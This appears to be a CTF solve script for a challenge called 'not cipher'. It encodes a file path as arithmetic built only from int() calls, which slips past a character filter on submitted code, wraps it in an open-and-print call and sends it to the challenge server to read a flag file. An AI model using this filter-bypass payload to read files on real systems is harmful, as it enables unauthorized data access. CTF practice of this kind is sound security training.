import requests

# define minimal variables for the value of each nibble
n0 = "int()"
n1 = n0 + "**" + n0
n2 = n1 + "+" + n1
n3 = n2 + "+" + n1
n4 = n2 + "+" + n2
n5 = n3 + "+" + n2
n6 = "(" + n3 + ")*(" + n2 + ")"
n7 = n6 + "+" + n1
n8 = "(" + n2 + ")**(" + n3 + ")"
n9 = "(" + n3 + ")*(" + n3 + ")"
n10 = "(" + n5 + ")*(" + n2 + ")"
n11 = n10 + "+" + n1
n12 = "(" + n4 + ")*(" + n3 + ")"
n13 = n12 + "+" + n1
n14 = "(" + n7 + ")*(" + n2 + ")"
n15 =  "(" + n5 + ")*(" + n3 + ")"
n16 = "(" + n2 + ")**(" + n4 + ")"

ns = [n0, n1, n2, n3, n4, n5, n6, n7, n8, n9, n10, n11, n12, n13, n14, n15, n16]
for i, n in enumerate(ns):
    print(i, len(n), eval(n), sep="\t")

def get_payload_for_char(c):
    parts = []
    for i, h in enumerate(reversed(hex(ord(c))[2:])):
        d = int(h, 16)
        n = ns[d]

        if i == 0:
            p = n
        else:  # i == 1
            p = "(" + n + ")*" + n16

        parts.append(p)

    payload = "chr(" + "+".join(parts) + ")"
    return payload

def get_payload_for_char_10(c):
    parts = []
    for i, h in enumerate(reversed(str(ord(c)))):
        d = int(h)
        n = ns[d]

        if i == 0:
            p = n
        elif i == 1:
            p = "(" + n + ")*" + n10
        else:
            p = "(" + n + ")*(" + n10 + ")**(" + n2 + ")"

        parts.append(p)

    payload = "chr(" + "+".join(parts) + ")"
    return payload

desired_str = "/lol/hemmeligmappe/flagg.txt"


# iterative
#payloads = []
#for c in desired_str:
#    payload = get_payload_for_char(c)
#    payloads.append(payload)
#payload = "print(*iter(open(" + "+".join(payloads) + ")))"

#for c in "abcdefghijklmnopqrstuvwxyz./":
#    l = len(get_payload_for_char(c))
#    l10 = len(get_payload_for_char_10(c))
#    print(c, l, l10, "16" if l <= l10 else "10")

# manual
payload = "print(*iter(open("
payload += get_payload_for_char("/") + "+"
payload += get_payload_for_char("l") + "+"
payload += get_payload_for_char("o") + "+"
payload += get_payload_for_char("l") + "+"
payload += get_payload_for_char("/") + "+"
payload += get_payload_for_char("h") + "+"
payload += get_payload_for_char("e") + "+"
#payload += get_payload_for_char("m") + "+"
#payload += get_payload_for_char("m") + "+"
payload += get_payload_for_char("m") + "*(" + n2 + ")+"
payload += get_payload_for_char("e") + "+"
payload += get_payload_for_char("l") + "+"
payload += get_payload_for_char("i") + "+"
payload += get_payload_for_char("g") + "+"
payload += get_payload_for_char("m") + "+"
payload += get_payload_for_char("a") + "+"
#payload += get_payload_for_char("p") + "+"
#payload += get_payload_for_char("p") + "+"
payload += get_payload_for_char("p") + "*(" + n2 + ")+"
payload += get_payload_for_char("e") + "+"
payload += get_payload_for_char("/") + "+"
payload += get_payload_for_char("f") + "+"
payload += get_payload_for_char("l") + "+"
payload += get_payload_for_char("a") + "+"
#payload += get_payload_for_char("g") + "+"
#payload += get_payload_for_char("g") + "+"
payload += get_payload_for_char("g") + "*(" + n2 + ")+"
payload += get_payload_for_char_10(".") + "+"  # 10 is a bit smaller for .
payload += get_payload_for_char("t") + "+"
payload += get_payload_for_char("x") + "+"
payload += get_payload_for_char("t")
payload += ")))"

print(len(payload))


# not cipher
url = "https://helsectf2024-2da207d37b091b1b4dff-not-cipher.chals.io"

# short not cipher
#url = "https://helsectf2024-2da207d37b091b1b4dff-short-not-cipher.chals.io"

params = {"program": payload}
resp = requests.get(url, params=params)
print(resp.text)

